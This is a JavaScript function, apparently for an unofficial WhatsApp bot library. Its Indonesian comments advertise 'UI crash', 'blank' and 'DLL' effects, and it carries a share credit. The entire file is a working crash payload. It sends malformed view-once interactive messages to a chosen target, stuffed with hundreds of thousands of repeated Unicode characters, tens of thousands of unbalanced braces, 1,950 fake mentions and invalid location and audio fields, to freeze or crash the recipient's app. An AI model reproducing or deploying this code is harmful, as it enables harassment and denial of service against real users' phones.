/*
EFEK?
• UI CRASH
• BLANK
• DLL
(ampas? biarin aja)
CREDITS @NortexZ
No hapus Credits Suki, terserah share pt, mls yaping
 */
 
async function VlstrCallUiCrash(sock, target) {
  try {
    const spamMention = Array.from({ length: 1950 }, () => `1${Math.floor(Math.random() * 999999999)}@s.whatsapp.net`);
    const ehemohok = "᬴".repeat(250000);
    const ngopi = "Aduhai bang bang";

    const norruimsg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                expiration: 1,
                ephemeralSettingTimestamp: 1,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [target],
                quotedMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
              },
              body: { text: ngopi + "ꦾ".repeat(50000) },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(20000),
                buttons: [
                  { name: "single_select", buttonParamsJson: "" },
                  { name: "call_permission_request", buttonParamsJson: "" }
                ]
              }
            }
          }
        }
      },
      {}
    )

    const markhama = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              contextInfo: {
                expiration: 1,
                ephemeralSettingTimestamp: 1,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 1,
                disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: [target],
                quotedMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
                externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true }
              },
              body: { text: ngopi + "ꦾ".repeat(50000) },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(20000),
                buttons: [
                  { name: "single_select", buttonParamsJson: "" },
                  { name: "call_permission_request", buttonParamsJson: "" }
                ]
              }
            }
          }
        }
      },
      {}
    )

    await sock.relayMessage(target, markhama.message, { participant: { jid: target }, messageId: markhama.key.id })
    await sock.sendMessage(target, { text: ehemohok, contextInfo: { mentionedJid: spamMention } })
    await sock.relayMessage(target, norruimsg.message, { messageId: norruimsg.key.id, participant: { jid: target } })

    const apalah = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ngopi, format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              version: 3,
              paramsJson: JSON.stringify({
                trigger: true,
                action: "call_crash",
                note: ngopi,
                filler: "꧔".repeat(50000)
              })
            }
          }
        }
      },
      nativeFlowMessage: { name: "render_crash_component", messageParamsJson: "{".repeat(70000) },
      audioMessage: {
        mimetype: "audio/ogg; codecs=opus",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "9999999999",
        seconds: 999999,
        ptt: true,
        streamingSidecar: "꧔꧈".repeat(9999)
      }
    }
    await sock.relayMessage(target, { message: apalah }, { messageId: norruimsg.key.id })

    const blankContent = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            quotedMessage: { paymentInviteMessage: { serviceType: 1, expiryTimestamp: null } },
            externalAdReply: { showAdAttribution: false, renderLargerThumbnail: true },
            header: {
              title: ngopi,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: 992.999999,
                degreesLongitude: -932.8889989,
                name: "\u900A",
                address: "\u0007".repeat(20000)
              }
            },
            body: { text: ngopi },
            interactiveResponseMessage: {
              body: { text: ngopi, format: "DEFAULT" },
              nativeFlowResponseMessage: {
                name: "galaxy_message",
                status: true,
                messageParamsJson: "{".repeat(5000) + "[".repeat(5000),
                paramsJson: `{
                  "screen_2_OptIn_0": true,
                  "screen_2_OptIn_1": true,
                  "screen_1_Dropdown_0": ngopi,
                  "screen_1_DatePicker_1": "1028995200000",
                  "screen_1_TextInput_2": "cyber@gmail.com",
                  "screen_1_TextInput_3": "94643116",
                  "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                  "screen_0_TextInput_1": "Why?",
                  "screen_0_Dropdown_2": "001-Grimgar",
                  "screen_0_RadioButtonsGroup_3": "0_true",
                  "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                }`,
                version: 3
              }
            }
          }
        }
      }
    }
    const blankahah = await generateWAMessageFromContent(target, blankContent, {})
    await sock.relayMessage(target, blankahah.message, { messageId: blankahah.key.id })
    console.log("bug terkirim");
  } catch (e) {
    console.error("error:", e)
  }
}